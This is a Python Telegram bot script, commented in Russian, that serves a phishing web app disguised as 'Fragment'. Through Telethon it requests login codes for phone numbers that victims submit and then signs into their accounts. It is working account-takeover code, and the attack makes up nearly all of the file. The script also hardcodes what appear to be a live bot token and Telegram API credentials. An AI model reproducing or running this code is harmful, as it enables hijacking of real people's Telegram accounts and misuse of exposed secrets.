import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient

# --- ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ОСНОВНОЙ КЛИЕНТ (Твой вход)
admin_client = TelegramClient('admin_auth', API_ID, API_HASH)
victim_clients = {}

@dp.message(Command("start"))
async def start(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
    await m.answer("🚀 Панель готова! Проверь консоль хостинга, если бот еще не запущен.")

@dp.message(F.web_app_data)
async def handle_data(m: types.Message):
    data = json.loads(m.web_app_data.data)
    action, phone = data.get("action"), data.get("phone")
    
    if action == "send_code":
        await m.answer(f"📩 Запрашиваю код для `{phone}`...")
        client = TelegramClient(f'v_{phone}', API_ID, API_HASH)
        victim_clients[phone] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            await m.answer("✅ Код отправлен жертве!")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

    elif action == "login_and_del":
        code, client = data.get("code"), victim_clients.get(phone)
        await m.answer(f"⚙️ Вхожу в `{phone}`...")
        try:
            await client.sign_in(phone, code)
            await m.answer(f"🔓 Вход в `{phone}` успешен!")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

async def main():
    # ПЕРВЫЙ ЗАХОД (Авторизация админа)
    await admin_client.start() 
    print("--- АДМИН АВТОРИЗОВАН ---")
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
